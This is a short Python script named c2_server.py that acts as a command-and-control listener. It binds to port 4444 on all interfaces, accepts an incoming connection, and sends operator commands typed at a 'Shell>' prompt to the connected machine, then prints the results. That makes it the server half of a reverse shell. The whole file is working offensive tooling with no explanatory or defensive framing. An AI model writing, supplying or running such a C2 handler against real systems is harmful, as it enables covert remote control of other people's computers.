# c2_server.py
import socket

# Configure the C2 server
HOST = '0.0.0.0'  # Listen on all network interfaces
PORT = 4444       # Port to listen on

def start_server():
    print("[INFO] Starting C2 server...")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        print(f"[INFO] Listening for connections on port {PORT}...")
        conn, addr = s.accept()
        with conn:
            print(f"[SUCCESS] Connected by {addr}")
            while True:
                command = input("Shell> ")
                if command.lower() == 'exit':
                    break
                conn.sendall(command.encode('utf-8'))
                data = conn.recv(1024)
                print(data.decode('utf-8', errors='ignore'))

if __name__ == "__main__":
    start_server()
